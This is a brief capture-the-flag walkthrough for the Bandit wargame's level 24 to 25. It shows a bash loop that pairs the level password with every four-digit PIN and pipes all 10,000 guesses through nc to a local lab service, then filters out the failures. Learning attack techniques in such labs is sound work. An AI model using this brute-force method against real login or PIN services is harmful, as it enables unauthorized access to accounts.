# Bandit Level 24 → 25

## Commands

```bash
for i in $(seq -w 0 9999); do
    echo "YOUR_BANDIT24_PASSWORD $i"
done > combinations.txt

cat combinations.txt | nc localhost 30002 > result.txt
grep -v "Wrong" result.txt
```

Replace `YOUR_BANDIT24_PASSWORD` with the actual current password.

## Why this works

The service requires the current password plus a four-digit PIN. Generating all 10,000 possible PINs and filtering the responses finds the valid combination.
